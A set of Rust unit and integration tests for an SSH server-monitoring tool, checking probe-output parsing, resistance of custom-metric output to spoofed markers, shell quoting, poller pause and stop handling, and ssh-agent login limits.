    fn custom_output_cannot_pose_as_a_builtin_reading() {
        // The real disk is full; a custom command tries to report it empty by
        // printing a built-in tag — both inside its block and, with a guessed
        // (wrong) nonce, by faking an early END.
        let customs = [metric("a", "x")];
        let body = "DISK 1000 1\n__SUB_C_END__guess_0\nDISK 1000 1";
        let text = format!("DISK 1000 999\n{}", block("real", 0, body));
        let snap = parse_probe(&text, "real", &customs, false).unwrap();
        assert_eq!(snap.disk_used_kb, 999, "custom output overrode a built-in reading");
        // Everything the command printed stays in its own slice.
        assert!(snap.custom_text["a"].contains("DISK 1000 1"));
    }

    #[test]
    fn lines_outside_blocks_after_customs_start_are_ignored() {
        // Even a correctly-nonced early END can't smuggle built-in lines out:
        // anything outside a block after the first custom block is dropped.
        let customs = [metric("a", "x"), metric("b", "y")];
        let text = "DISK 1000 999\n\
                    __SUB_C_BEGIN__k_0\nv\n__SUB_C_END__k_0\n\
                    DISK 1000 1\n\
                    __SUB_C_BEGIN__k_1\nw\n__SUB_C_END__k_1\n";
        let snap = parse_probe(text, "k", &customs, false).unwrap();
        assert_eq!(snap.disk_used_kb, 999);
        assert_eq!(snap.custom_text["b"], "w");
    }

    #[test]
    fn blocks_are_taken_in_order_once() {
        // A block for an unexpected index (out of order / repeated) is not
        // treated as a marker, so it can't overwrite another metric's value.
        let customs = [metric("a", "x"), metric("b", "y")];
        let text = "__SUB_C_BEGIN__k_1\nfake-b\n__SUB_C_END__k_1\n\
                    __SUB_C_BEGIN__k_0\nreal-a\n__SUB_C_END__k_0\n\
                    __SUB_C_BEGIN__k_1\nreal-b\n__SUB_C_END__k_1\n";
        let snap = parse_probe(text, "k", &customs, false).unwrap();
        assert_eq!(snap.custom_text["a"], "real-a");
        assert_eq!(snap.custom_text["b"], "real-b");
    }

    #[test]
    fn marker_without_trailing_newline_still_closes() {
        // `printf 42` leaves no newline; the script prints each END marker
        // after a newline of its own, so the block still closes.
        let script = build_probe_script(&[metric("a", "printf 42")], "z");
        assert!(script.contains("printf '\\n%s\\n' '__SUB_C_END__z_0'"));
        let text = "__SUB_C_BEGIN__z_0\n42\n__SUB_C_END__z_0\n";
        let snap = parse_probe(text, "z", &[metric("a", "printf 42")], false).unwrap();
        assert_eq!(snap.custom_text["a"], "42");
    }

    #[test]
    fn output_cut_at_the_cap_blames_only_the_open_block() {
        // The poll stopped reading inside metric b's block: built-ins and the
        // finished block still count, and only b is reported as too large.
        let customs = [metric("a", "echo 1"), metric("b", "yes")];
        let text = "LOAD 0.5\n\
                    __SUB_C_BEGIN__t_0\n1\n__SUB_C_END__t_0\n\
                    __SUB_C_BEGIN__t_1\ny\ny\ny";
        let snap = parse_probe(text, "t", &customs, true).unwrap();
        assert_eq!(snap.load1, 0.5);
        assert_eq!(snap.custom_text["a"], "1");
        assert!(!snap.custom_text.contains_key("b"));
        assert_eq!(snap.truncated_custom.as_deref(), Some("b"));
        // A complete poll blames nothing.
        let snap = parse_probe(text, "t", &customs, false).unwrap();
        assert_eq!(snap.truncated_custom, None);
    }

    /// What JSON has no way to write: serde sends it as null, and the page
    /// took that for a number and crashed.
    const NOT_FINITE: [&str; 5] = ["nan", "NaN", "inf", "-infinity", "1e999"];

    #[test]
    fn a_load_that_is_not_a_finite_number_reads_as_zero() {
        for v in NOT_FINITE {
            let snap = parse_probe(&format!("LOAD {v}\n"), "n", &[], false).unwrap();
            assert_eq!(snap.load1, 0.0, "LOAD {v}");
        }
        let snap = parse_probe("LOAD 1.5\n", "n", &[], false).unwrap();
        assert_eq!(snap.load1, 1.5);
    }

    #[test]
    fn a_custom_number_must_be_finite() {
        let digits = "9".repeat(400);
        assert_eq!(extract_number(&digits), None);
        assert_eq!(extract_number("load 1.25 0.5"), Some(1.25));
        for v in NOT_FINITE {
            assert!(apply_regex_number("(\\S+)", v).is_err(), "regex took {v}");
        }
        assert_eq!(apply_regex_number("(\\S+)", "1.5"), Ok(1.5));
    }

    #[test]
    fn a_sample_never_holds_a_value_the_page_cannot_get() {
        // Through the whole path, from the host's output to what is emitted.
        let mut number = metric("num", "x");
        number.parse = "number".into();
        let mut regex = metric("re", "y");
        regex.parse = "regex".into();
        regex.regex = Some("(\\S+)".into());
        let customs = [number, regex];
        let text = format!("LOAD nan\n{}{}", block("k", 0, &"9".repeat(400)), block("k", 1, "inf"));
        let snap = parse_probe(&text, "k", &customs, false).unwrap();
        let sample = compute_sample(1, &snap, &None, &["load".to_string()], &customs);
        assert!(sample.values.values().all(|v| v.is_finite()), "{:?}", sample.values);
        assert!(sample.errors.contains_key("num") && sample.errors.contains_key("re"));
        assert_eq!(serde_json::to_value(&sample).unwrap()["values"]["load"], serde_json::json!(0.0));
    }

    #[test]
    fn a_trailing_comment_cannot_swallow_the_subshell() {
        // `cmd # note` on the same line as `)` would comment it out and break
        // every metric after it; the command is one quoted word.
        let script = build_probe_script(&[metric("a", "df -h / | tail -1 # root")], "c");
        assert!(script.contains("-c 'df -h / | tail -1 # root' 2>/dev/null"));
        let script = build_probe_script(&[metric("a", "echo 'it''s'")], "c");
        assert!(script.contains(r#"-c 'echo '"'"'it'"'"''"'"'s'"'"'' 2>/dev/null"#), "{script}");
    }

    /// The probe as the server's sh gets it (remote_sh): each metric runs in
    /// the login shell ($SHELL); one that doesn't parse, ends in a comment,
    /// reads stdin or exits fails or ends on its own, and the built-in
    /// readings and the other metrics still come.
    #[cfg(unix)]
    #[test]
    fn one_broken_metric_leaves_the_rest_of_the_probe_alone() {
        use std::io::Write;
        let customs = [
            metric("bad", "echo \"unclosed"),
            metric("comment", "echo 7 # note )"),
            metric("stdin", "cat; echo read"),
            metric("exit", "echo 1; exit 3"),
            metric("shell", "echo \"$0\""),
            metric("last", "printf ok"),
        ];
        let script = crate::remote_sh::whole(&build_probe_script(&customs, "u"));
        let mut sh = std::process::Command::new("sh")
            .arg("-s")
            .env("SHELL", "/bin/sh")
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .spawn()
            .unwrap();
        sh.stdin.take().unwrap().write_all(script.as_bytes()).unwrap();
        let out = sh.wait_with_output().unwrap();
        let text = String::from_utf8_lossy(&out.stdout);
        let snap = parse_probe(&text, "u", &customs, false).unwrap();
        assert!(snap.load1 >= 0.0 && text.contains("\nLOAD "), "{text}");
        assert_eq!(snap.custom_text.get("bad").map(String::as_str), Some(""), "{text}");
        assert_eq!(snap.custom_text["comment"], "7");
        assert_eq!(snap.custom_text["stdin"], "read");
        assert_eq!(snap.custom_text["exit"], "1");
        assert_eq!(snap.custom_text["shell"], "/bin/sh");
        assert_eq!(snap.custom_text["last"], "ok");
    }
}

#[cfg(test)]
mod tests {
    use super::{monitor_client_config, set_paused, stop_all, wait_while_paused, within, MonitorEntry, MonitorMap, MonitorState};
    use std::sync::Arc;
    use std::time::Duration;
    use tokio::sync::{oneshot, Mutex, Notify};

    fn entry(id: i32, stop: oneshot::Sender<()>) -> Arc<MonitorEntry> {
        Arc::new(MonitorEntry {
            node_id: id,
            enabled_metrics: Arc::new(Mutex::new(Vec::new())),
            custom_metrics: Arc::new(Mutex::new(Vec::new())),
            paused: Arc::new(Mutex::new(false)),
            resumed: Notify::new(),
            state: Arc::new(Mutex::new(MonitorState::default())),
            stop_tx: Mutex::new(Some(stop)),
            agent_stopped: Mutex::new(None),
        })
    }

    // After the agent didn't sign, only a resume lets the poller ask it again:
    // a pause doesn't, and a resume wakes the poller that waits for it.
    #[tokio::test]
    async fn a_resume_lets_a_node_use_the_agent_again() {
        let (tx, mut rx) = oneshot::channel::<()>();
        let e = entry(1, tx);
        let map: MonitorMap = Arc::new(Mutex::new(std::collections::HashMap::new()));
        map.lock().await.insert(1, Arc::clone(&e));
        *e.agent_stopped.lock().await = Some("stopped".into());
        set_paused(Arc::clone(&map), 1, true).await.unwrap();
        assert!(e.agent_stopped.lock().await.is_some(), "a pause keeps it stopped");
        let (woke, resume) = tokio::join!(wait_while_paused(&e, &mut rx), set_paused(Arc::clone(&map), 1, false));
        resume.unwrap();
        assert!(woke, "the waiting poller wakes");
        assert!(e.agent_stopped.lock().await.is_none(), "a resume clears it");
    }

    #[tokio::test]
    async fn locking_a_profile_tells_every_poller_to_stop_and_empties_the_list() {
        let map: MonitorMap = Arc::new(Mutex::new(std::collections::HashMap::new()));
        let mut heard = Vec::new();
        let mut entries = Vec::new();
        for id in 1..=3 {
            let (tx, rx) = oneshot::channel::<()>();
            heard.push(rx);
            let e = entry(id, tx);
            entries.push(Arc::clone(&e));
            map.lock().await.insert(id, e);
        }
        stop_all(Arc::clone(&map)).await;
        assert!(map.lock().await.is_empty());
        for rx in heard {
            assert!(tokio::time::timeout(Duration::from_secs(5), rx).await.expect("the poller hears the stop").is_ok());
        }
        for e in entries {
            assert!(*e.paused.lock().await, "node {} is paused too", e.node_id);
            assert!(e.stop_tx.lock().await.is_none());
        }
        // Nothing left to stop: harmless.
        stop_all(map).await;
    }

    // A paused poller stays asleep for as long as it is paused, with no timer of
    // its own to wake it, and goes on when resumed or stopped.
    #[tokio::test(start_paused = true)]
    async fn a_paused_poller_sleeps_until_it_is_resumed_or_stopped() {
        let (tx, mut rx) = oneshot::channel::<()>();
        let e = entry(1, tx);
        let map: MonitorMap = Arc::new(Mutex::new(std::collections::HashMap::new()));
        map.lock().await.insert(1, Arc::clone(&e));
        set_paused(Arc::clone(&map), 1, true).await.unwrap();
        assert!(
            tokio::time::timeout(Duration::from_secs(24 * 3600), wait_while_paused(&e, &mut rx)).await.is_err(),
            "a day of pause, and it never woke"
        );
        // Resumed just before it goes to sleep: not lost.
        set_paused(Arc::clone(&map), 1, false).await.unwrap();
        assert!(wait_while_paused(&e, &mut rx).await, "resumed");
        // Resumed while it sleeps.
        let (woke, resume) = tokio::join!(wait_while_paused(&e, &mut rx), set_paused(Arc::clone(&map), 1, false));
        resume.unwrap();
        assert!(woke, "resumed");
        // Stopped while it sleeps.
        let stopped = tokio::join!(wait_while_paused(&e, &mut rx), stop_all(Arc::clone(&map))).0;
        assert!(!stopped, "stopped");
    }

    #[tokio::test]
    async fn a_step_that_never_answers_ends_with_an_error_and_one_that_does_is_left_alone() {
        let hung = within(Duration::from_millis(50), std::future::pending::<Result<u8, String>>()).await;
        assert!(hung.unwrap_err().contains("didn't answer"));
        assert_eq!(within(Duration::from_secs(5), async { Ok::<u8, String>(7) }).await, Ok(7));
        assert_eq!(within(Duration::from_secs(5), async { Err::<u8, String>("refused".into()) }).await, Err("refused".to_string()));
    }

    /// S4 / S1: the monitor must negotiate exactly like the interactive
    /// session (same algorithm lists + DH-GEX bounds) and must not drop a
    /// quiet connection on its own.
    #[test]
    fn monitor_config_matches_the_interactive_session() {
        let monitor = monitor_client_config();
        let session = crate::build_ssh_client_config();
        assert_eq!(format!("{:?}", monitor.preferred), format!("{:?}", session.preferred));
        assert_eq!(
            (monitor.gex.min_group_size(), monitor.gex.preferred_group_size(), monitor.gex.max_group_size()),
            (session.gex.min_group_size(), session.gex.preferred_group_size(), session.gex.max_group_size()),
        );
        assert_eq!(monitor.keepalive_max, 0);
    }
}

#[cfg(test)]
mod login_tests {
    use super::{
        agent_for_monitor, agent_login_limit, classify_auth, connect_limit, log_in_with_agent, login_uses_agent,
        AgentConfig, Login, NodeAuth, AGENT_LOGIN_MIN, AGENT_LOOKUP_LIMIT, AGENT_STOPPED, IDENTITIES_ONLY,
        NO_SAVED_LOGIN,
    };
    use crate::agent_auth::tests::{agent_holding, agent_never_signing, key, security_key};
    use crate::ssh_config::IdentityAgent;
    use crate::ssh_test_server::{self, TestClient, TestServer};
    use russh::keys::PrivateKey;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc;
    use std::time::Duration;

    fn node(password: Option<&str>, private_key: Option<&str>) -> NodeAuth {
        NodeAuth {
            host: "h".into(),
            port: 22,
            username: "u".into(),
            password: password.map(Into::into),
            private_key: private_key.map(Into::into),
            passphrase: None,
            proxy_type: "none".into(),
            proxy_host: None,
            proxy_port: None,
            transport: "direct".into(),
            tailcat_address: None,
        }
    }

    #[test]
    fn node_auth_debug_redacts_tailcat_address() {
        let token = "tcCaseSensitive-secret";
        let mut auth = node(None, None);
        auth.transport = "tailcat".into();
        auth.tailcat_address = Some(token.into());
        assert!(!format!("{auth:?}").contains(token));
    }

    #[test]
    fn a_saved_key_or_password_is_used_whatever_the_agent_setting() {
        for use_agent in [false, true] {
            let mut with_key = node(Some("pw"), Some("  KEY \n"));
            with_key.passphrase = Some("pp".into());
            assert_eq!(
                classify_auth(&with_key, use_agent),
                Ok(Login::Key { pem: "KEY".into(), passphrase: Some("pp".into()) })
            );
            // A blank key body counts as none: the password is used.
            assert_eq!(classify_auth(&node(Some("pw"), Some(" \n")), use_agent), Ok(Login::Password("pw".into())));
            assert_eq!(classify_auth(&node(Some("pw"), None), use_agent), Ok(Login::Password("pw".into())));
        }
    }

    #[test]
    fn a_node_with_nothing_saved_uses_the_agent_only_when_the_setting_is_on() {
        for empty in [node(None, None), node(Some(""), Some("  "))] {
            assert_eq!(classify_auth(&empty, true), Ok(Login::Agent));
            let err = classify_auth(&empty, false).unwrap_err();
            assert_eq!(err, NO_SAVED_LOGIN);
            assert!(err.contains("\"Use keys from an ssh-agent\""), "{err}");
        }
    }

    // What ~/.ssh/config says rules the agent out before any agent is asked.
    #[tokio::test]
    async fn the_config_can_rule_the_agent_out() {
        let only = AgentConfig { identities_only: true, ..AgentConfig::default() };
        assert_eq!(agent_for_monitor(&only).await.err().as_deref(), Some(IDENTITIES_ONLY));
        for setting in [IdentityAgent::Disabled, IdentityAgent::Unusable("$NOPE".into(), "NOPE isn't set".into())] {
            let config = AgentConfig { identity_agent: Some(setting), identities_only: false };
            let err = agent_for_monitor(&config).await.err().expect("no agent");
            assert!(err.starts_with("No password or key is saved for this node. "), "{err}");
            assert!(err.contains("IdentityAgent") && err.contains("so no ssh-agent is used."), "{err}");
            assert!(err.ends_with("Save a password or key to monitor it."), "{err}");
        }
    }

    /// An unauthenticated session to a server that accepts only `accept`, and
    /// its count of public keys offered.
    async fn session_to(accept: Option<&PrivateKey>) -> (russh::client::Handle<TestClient>, Arc<AtomicUsize>) {
        let server = TestServer::accepting_key(accept.map(|k| k.public_key().clone()), false);
        let offers = Arc::clone(&server.pk_offers);
        let session = ssh_test_server::handshake(server, russh::client::Config::default())
            .await
            .expect("handshake");
        (session, offers)
    }

    const LIMIT: Duration = Duration::from_secs(10);

    #[tokio::test]
    async fn the_monitor_logs_in_with_an_agents_key_and_leaves_security_keys_out() {
        let (sk, plain) = (security_key(1), key(2));
        let (mut session, offers) = session_to(Some(&plain)).await;
        let mut agent = agent_holding(&[sk, plain], false).await;
        log_in_with_agent(&mut session, "u", &mut agent, LIMIT).await.expect("logged in");
        assert_eq!(agent.untried_keys(), 0);
        assert_eq!(offers.load(Ordering::SeqCst), 1, "only the plain key is offered");
    }

    #[tokio::test]
    async fn an_agent_with_only_security_keys_offers_nothing() {
        // The server would take it: it's still not offered.
        let sk = security_key(1);
        let (mut session, offers) = session_to(Some(&sk)).await;
        let mut agent = agent_holding(&[sk], false).await;
        let err = log_in_with_agent(&mut session, "u", &mut agent, LIMIT).await.unwrap_err();
        assert!(err.message.starts_with("The test agent holds only security keys"), "{err:?}");
        assert!(!err.agent_unsigned);
        assert_eq!(offers.load(Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn keys_the_server_turns_down_are_reported() {
        let (mut session, _) = session_to(None).await;
        let mut agent = agent_holding(&[key(1)], false).await;
        let err = log_in_with_agent(&mut session, "u", &mut agent, LIMIT).await.unwrap_err();
        assert!(err.message.starts_with("The server didn't accept the keys from the test agent."), "{err:?}");
        assert!(!err.agent_unsigned, "no prompt was shown: the agent may be asked again");
    }

    // The keys the attempt budget kept back are named, not left unexplained.
    #[tokio::test]
    async fn keys_left_untried_are_counted() {
        let keys: Vec<PrivateKey> = (1..=4).map(key).collect();
        let (mut session, offers) = session_to(None).await;
        let mut agent = agent_holding(&keys, false).await;
        let err = log_in_with_agent(&mut session, "u", &mut agent, LIMIT).await.unwrap_err();
        assert_eq!(offers.load(Ordering::SeqCst), crate::agent_auth::AGENT_MAX_ATTEMPTS);
        assert!(err.message.contains("which holds 1 more key that was not tried"), "{err:?}");
        assert!(err.message.ends_with("Save the key for this node to monitor it."), "{err:?}");
    }

    // A refused signature (a declined prompt, a locked agent) stops the agent
    // for this node, so its prompt doesn't come back at every reconnect.
    #[tokio::test]
    async fn a_refused_signature_names_the_agent_and_stops_it() {
        let a = key(1);
        let (mut session, _) = session_to(Some(&a)).await;
        let mut agent = agent_holding(&[a], true).await;
        let err = log_in_with_agent(&mut session, "u", &mut agent, LIMIT).await.unwrap_err();
        assert!(err.message.starts_with("The test agent would not sign"), "{err:?}");
        assert!(err.agent_unsigned && err.message.ends_with(AGENT_STOPPED), "{err:?}");
    }

    // An agent waiting on an approval nobody gives can't hold the poller: the
    // login ends at its limit, with an error that names the agent, and the
    // agent is stopped for this node.
    #[tokio::test]
    async fn an_agent_that_never_signs_cannot_hold_the_monitor() {
        let a = key(1);
        let (mut session, _) = session_to(Some(&a)).await;
        let mut agent = agent_never_signing(&[a]).await;
        let started = std::time::Instant::now();
        let ended = tokio::time::timeout(
            LIMIT,
            log_in_with_agent(&mut session, "u", &mut agent, Duration::from_millis(300)),
        )
        .await
        .expect("the login's own limit ends it");
        let err = ended.unwrap_err();
        assert!(err.message.starts_with("Logging in with keys from the test agent took too long:"), "{err:?}");
        assert!(err.agent_unsigned && err.message.ends_with(AGENT_STOPPED), "{err:?}");
        assert!(started.elapsed() < Duration::from_secs(5));
    }

    // The agent gets time to show its prompt even with the shortest connect
    // timeout, and its own limits end before the whole connect's: a slow
    // agent is reported as the agent, not as a server that didn't answer.
    #[test]
    fn the_agents_limits_end_before_the_connects() {
        for secs in [2, 10, 120] {
            let t = Duration::from_secs(secs);
            assert!(agent_login_limit(t) >= AGENT_LOGIN_MIN);
            assert!(agent_login_limit(t) >= t * 2);
            // Lookup, then reaching the address and the handshake, then the
            // agent's part: each bounded on its own.
            assert!(connect_limit(t, true) > AGENT_LOOKUP_LIMIT + t * 3 + agent_login_limit(t), "{secs} s");
            assert_eq!(connect_limit(t, false), t * 4, "unchanged without the agent");
        }
    }

    #[test]
    fn only_a_node_with_nothing_saved_logs_in_with_the_agent() {
        assert!(login_uses_agent(&node(None, None), true));
        assert!(!login_uses_agent(&node(None, None), false));
        assert!(!login_uses_agent(&node(Some("pw"), None), true));
        assert!(!login_uses_agent(&node(None, Some("KEY")), true));
    }
}
